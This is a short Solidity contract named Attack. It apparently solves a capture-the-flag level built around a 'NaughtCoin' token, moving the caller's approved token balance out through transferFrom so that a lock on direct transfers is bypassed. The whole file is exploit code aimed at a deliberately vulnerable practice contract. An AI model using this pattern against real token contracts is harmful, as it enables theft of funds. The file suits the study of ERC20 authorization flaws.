// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract Attack {
    address public coin;

    constructor(address _coin) {
        coin = _coin;
    }
    
    function withdraw() public returns(bool) {
        NaughtCoin token = NaughtCoin(coin);
        uint amount = token.allowance(msg.sender, address(this));
        return token.transferFrom(msg.sender, address(this), amount);
    }

}
